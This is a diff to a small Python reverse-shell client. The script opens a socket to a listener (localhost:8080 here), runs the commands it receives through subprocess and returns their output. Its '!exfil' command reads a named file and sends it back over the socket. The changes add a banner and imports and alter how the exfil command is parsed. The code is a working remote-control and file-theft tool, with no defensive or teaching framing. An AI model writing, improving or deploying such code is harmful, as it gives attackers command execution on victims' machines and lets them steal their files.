@@ -3,11 +3,13 @@
 import socket
 import subprocess
 import os
+from lib.banner import *
+from lib.functions import *
 
 
-
-
-
+#
+#
+#
 def transfer(s,file):
 	if os.path.exists(file):
 		f = open(file, 'rb')
@@ -22,9 +24,9 @@ def transfer(s,file):
 		s.send('File not found')
 
 
-
-
-
+#
+#
+#
 def connect():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect(('localhost', 8080))
@@ -37,7 +39,7 @@ def connect():
 			break
 
 		elif '!exfil' in cmd:
-			exfil,file = cmd.split("*")
+			exfil,file = cmd.split("!exfil ")
 
 			try:
 				transfer(s,file)
@@ -51,14 +53,15 @@ def connect():
 			s.send(CMD.stderr.read())
 
 
-
-
-
+#
+#
+#
 def main():
+	print(clibanner)
 	connect()
 
 
-
-
-
+#
+#
+#
 main()
